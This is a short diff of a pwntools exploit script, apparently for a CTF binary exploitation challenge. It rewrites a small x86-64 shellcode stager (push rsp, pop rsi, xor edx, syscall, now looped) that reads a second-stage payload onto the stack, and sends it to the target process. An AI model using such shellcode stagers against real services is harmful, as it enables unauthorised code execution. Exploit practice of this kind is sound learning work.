@@ -20,14 +20,26 @@ sc = flat(
 
 #print disasm( sc )
 
+"""
 _asm = '''
 push rsp
 pop rsi
 xor edx,esp
 syscall
 '''
+"""
 
-y.sendafter( ':' , asm( _asm ) + '\x75\xfa'  ) # jne    0xfffffffffffffffc -> jne -4
+_asm = '''
+    push rsp
+    pop rsi
+y:
+    xor edx,esp
+    syscall
+    jmp y
+'''
+
+y.sendafter( ':' , asm( _asm ) )
+#y.sendafter( ':' , asm( _asm ) + '\x75\xfa'  ) # jne    0xfffffffffffffffc -> jne -4
 
 sleep(0.7)
 
